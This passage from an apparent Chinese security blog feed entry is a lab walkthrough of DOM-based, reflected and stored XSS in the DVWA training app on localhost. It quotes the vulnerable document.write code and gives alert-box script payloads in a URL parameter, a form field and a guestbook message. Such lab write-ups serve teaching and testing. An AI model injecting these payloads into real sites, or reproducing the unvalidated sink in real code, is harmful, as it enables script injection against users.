class=&#34;name&#34;&gt;label&lt;/span&gt;&amp;gt;&lt;/span&gt; 标签为 input 元素定义标注（标记）。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，源码中显示这个 form 标签里面嵌有一段 script 标签引起的 JavaScript 代码&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        var lang = document.location.href.substring(document.location.href.indexOf(&amp;quot;default=&amp;quot;)+8);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot; + lang + &amp;quot;&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot; + (lang) + &amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;        document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;disabled&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;disabled&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;----&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;English&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;English&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;French&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;French&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;Spanish&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;Spanish&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;    document.write(&amp;quot;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;German&amp;#x27;&lt;/span&gt;&amp;gt;&lt;/span&gt;German&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;option&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;language-handlebars&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;主逻辑是：&lt;/p&gt;
&lt;p&gt;获取当前 form 表单 document 的 location 对象的 href（当前浏览的 url 值，对于下图就是 &lt;code&gt;http://127.0.0.1/DVWA/vulnerabilities/xss_d/&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;然后判断这个 url 字符串中 “default=” 第一次出现的位置是否 &amp;gt;=0&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004215924339.png&#34; alt=&#34;image-20221004215924339&#34;&gt;&lt;/p&gt;
&lt;p&gt;当然，我们回到刚刚的页面上就是在获取这个 url&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004220400905.png&#34; alt=&#34;image-20221004220400905&#34;&gt;&lt;/p&gt;
&lt;p&gt;substring(start,stop)&lt;/p&gt;
&lt;p&gt;然后截取从 “default=” 第一次出现的位置 + 8【也就是 = 号右边第一个字符，把整个 “default=” 跨了过去】到结尾的内容的字符串，保存到 lang 变量。&lt;/p&gt;
&lt;p&gt;往 document，也就是当前 html 页面的 option 标签的 value 值中写入刚刚获取到的 lang 值，其选项显示部分使用 decoreURI 对 lang 进行解码，由于 English 中未含有非英文部分，所以就是 English。【这一步会往选项里再添加一个 English】&lt;/p&gt;
&lt;p&gt;接着往当前 html 页面的 option 标签里的 value 写入空，且关闭其选择属性，加入 ---- 这个选项。【这一步会往选项里再添加一个 ----】&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004221129050.png&#34; alt=&#34;image-20221004221129050&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，我们可以看到，这个 lang 是从当前 url 里获取到的，且未经过任何校验就直接写入标签中。&lt;/p&gt;
&lt;p&gt;我们可以控制这个 lang 变量，使其直接执行 js 脚本&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004221907384.png&#34; alt=&#34;image-20221004221907384&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//127.0.0.1/DVWA/vulnerabilities/xss_d/?default=&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004222113645.png&#34; alt=&#34;image-20221004222113645&#34;&gt;&lt;/p&gt;
&lt;p&gt;其改变了当前 HTML 的页面 DOM 结构，因此，我们称其为 DOM 型 XSS 攻击。&lt;/p&gt;
&lt;h2 id=&#34;反射型xss-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射型xss-2&#34;&gt;#&lt;/a&gt; 反射型 XSS&lt;/h2&gt;
&lt;p&gt;我们输入 11111，结果看到页面回显了 &amp;quot;Hello 11111&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004222654007.png&#34; alt=&#34;image-20221004222654007&#34;&gt;&lt;/p&gt;
&lt;p&gt;看一下前台代码，是使用 GET 请求去将获取 text 的内容发送给服务器，而 text 我们可控&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004222954963.png&#34; alt=&#34;image-20221004222954963&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入 11111，会回显到前台。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004223147315.png&#34; alt=&#34;image-20221004223147315&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，我们发现 11111 可能未经过处理，直接放入 pre 标签显示。&lt;/p&gt;
&lt;p&gt;因此可以在 pre 标签里插入 script 标签，完成弹窗操作。&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;alert(666)&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004223056096.png&#34; alt=&#34;image-20221004223056096&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为这个页面将一些交互内容回显到了前台上，使得我们成功利用 Js 脚本完成攻击，我们称其为反射型 XSS 攻击。&lt;/p&gt;
&lt;h2 id=&#34;存储型xss-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储型xss-2&#34;&gt;#&lt;/a&gt; 存储型 XSS&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004223720910.png&#34; alt=&#34;image-20221004223720910&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们通过留言功能，可以看到我们的输入会被记录在页面上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004223847678.png&#34; alt=&#34;image-20221004223847678&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们按照刚刚的思路，直接尝试看看能否弹窗。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Name：jack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Message：&amp;lt;script&amp;gt;alert(1234)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;刷新回来后会一直弹窗&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004224120560.png&#34; alt=&#34;image-20221004224120560&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们看下源码信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004224444379.png&#34; alt=&#34;image-20221004224444379&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们看到 Name 的 maxlength 为 10，Message 的 length 为 50，所以使用 Message 来做 XSS 攻击更合适一些&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;最简短的js脚本也有24个字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004224705526.png&#34; alt=&#34;image-20221004224705526&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果两个长度都不限，则都适合用来 XSS 攻击。&lt;/p&gt;
</content>
        <category term="XSS跨站脚本攻击探究" />
        <updated>2022-10-04T16:56:24.000Z</updated>
    </entry>
</feed>
